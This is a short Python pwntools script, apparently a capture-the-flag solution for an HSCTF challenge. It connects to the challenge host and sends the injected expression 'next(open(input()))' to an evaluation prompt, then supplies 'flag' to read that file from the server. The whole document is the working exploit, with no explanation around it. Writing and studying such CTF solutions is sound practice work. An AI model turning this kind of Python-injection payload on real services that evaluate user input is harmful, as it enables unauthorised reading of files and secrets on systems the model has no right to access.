from pwn import *

s = remote("paas.hsctf.com", 1337)
s.sendlineafter(b"> ", b'next(open(input()))')
s.sendline(b"flag")
print(s.recvuntil(b"> ").decode().split("\n")[0])
